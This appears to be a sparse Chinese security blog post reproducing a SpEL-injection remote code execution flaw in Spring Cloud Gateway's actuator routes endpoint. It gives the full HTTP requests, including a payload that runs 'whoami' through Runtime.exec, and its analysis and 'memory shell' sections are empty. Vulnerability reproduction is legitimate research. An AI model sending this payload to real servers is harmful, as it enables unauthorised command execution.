## SpringBoot GatewayEL表达式漏洞分析

### 前言





----



### 漏洞复现

```http
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Content-Length: 368

{
      "id": "hacktest",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String(\"whoami\")).getInputStream()))}"}
        }],
      "uri": "http://example.com",
      "order": 0
}
```

![image-20220417165248745](https://img.sumsec.me//2022/03/48u5248ec48u5248ec.png)



---

```http
POST /actuator/gateway/refresh HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

![image-20220417165229679](https://img.sumsec.me//2022/03/36u5236ec36u5236ec.png)



```http
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded


```

![image-20220417170055653](https://img.sumsec.me//2022/03/55u055ec55u055ec.png)







```http
DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

![image-20220417165316424](https://img.sumsec.me//2022/03/16u5316ec16u5316ec.png)

```http
POST /actuator/gateway/refresh HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```



![image-20220417165324564](https://img.sumsec.me//2022/03/24u5324ec24u5324ec.png)

----

内存马：









### 参考





